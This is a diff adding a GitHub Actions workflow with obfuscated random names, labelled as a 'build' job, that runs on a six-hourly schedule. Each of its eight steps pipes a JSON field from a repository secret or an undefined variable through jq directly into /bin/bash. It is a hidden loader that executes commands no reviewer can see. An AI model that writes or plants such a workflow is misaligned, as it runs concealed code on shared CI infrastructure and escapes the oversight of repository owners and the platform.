@@ -1,0 +1,24 @@
+name: taomadeng6719
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: taomadeng6719
+        env:
+          ri378: ${{ secrets.ri378 }}
+        run: |
+          echo $ri378 | jq -r .dq87796 | /bin/bash
+          echo $rhtr49417 | jq -r .m645 | /bin/bash
+          echo $ofsm46 | jq -r .or194 | /bin/bash
+          echo $dw5 | jq -r .msnk191 | /bin/bash
+          echo $tofou4 | jq -r .pt95 | /bin/bash
+          echo $tuqy4608 | jq -r .sax3713 | /bin/bash
+          echo $z6 | jq -r .psubt520 | /bin/bash
+          echo $zt996 | jq -r .mvo329 | /bin/bash
+
